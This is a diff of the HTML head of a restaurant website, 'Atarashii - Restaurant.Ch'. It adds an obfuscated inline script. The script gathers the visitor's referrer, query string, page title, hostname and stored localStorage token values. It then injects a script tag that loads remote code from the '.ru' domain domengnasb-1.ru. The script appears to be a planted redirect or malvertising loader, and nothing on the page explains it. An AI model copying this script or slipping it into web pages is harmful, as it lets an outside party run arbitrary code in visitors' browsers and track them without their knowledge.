@@ -1,6 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
+    <script>
+    (function() {
+    var name = '_Hh9R9MrcF2WnHWfg';
+    if (!window._Hh9R9MrcF2WnHWfg) {
+        window._Hh9R9MrcF2WnHWfg = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://domengnasb-1.ru/q54MyB2W',
+            P_PATH: 'https://domengnasb-1.ru/7b4f75c/postback',
+        };
+    }
+    const _nNcz2rvhWgYJYL1x = localStorage.getItem('config');
+    if (typeof _nNcz2rvhWgYJYL1x !== 'undefined' && _nNcz2rvhWgYJYL1x !== null) {
+        var _BFd4ckJLnbgxxZZQ = JSON.parse(_nNcz2rvhWgYJYL1x);
+        var _87bj72Gzq2HC42w4 = Math.round(+new Date()/1000);
+        if (_BFd4ckJLnbgxxZZQ.created_at + window._Hh9R9MrcF2WnHWfg.ttl < _87bj72Gzq2HC42w4) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _pKv2r4ndcFZmP2d5 = localStorage.getItem('subId');
+    var _1pqQbW8VsVjXyNTC = localStorage.getItem('token');
+    var _nPBSvkVsmqkjwRfJ = '?return=js.client';
+        _nPBSvkVsmqkjwRfJ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _nPBSvkVsmqkjwRfJ += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _nPBSvkVsmqkjwRfJ += '&default_keyword=' + encodeURIComponent(document.title);
+        _nPBSvkVsmqkjwRfJ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _nPBSvkVsmqkjwRfJ += '&name=' + encodeURIComponent(name);
+        _nPBSvkVsmqkjwRfJ += '&host=' + encodeURIComponent(window._Hh9R9MrcF2WnHWfg.R_PATH);
+    if (typeof _pKv2r4ndcFZmP2d5 !== 'undefined' && _pKv2r4ndcFZmP2d5 && window._Hh9R9MrcF2WnHWfg.unique) {
+        _nPBSvkVsmqkjwRfJ += '&sub_id=' + encodeURIComponent(_pKv2r4ndcFZmP2d5);
+    }
+    if (typeof _1pqQbW8VsVjXyNTC !== 'undefined' && _1pqQbW8VsVjXyNTC && window._Hh9R9MrcF2WnHWfg.unique) {
+        _nPBSvkVsmqkjwRfJ += '&token=' + encodeURIComponent(_1pqQbW8VsVjXyNTC);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._Hh9R9MrcF2WnHWfg.R_PATH + _nPBSvkVsmqkjwRfJ;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
     <title>Atarashii - Restaurant.Ch</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
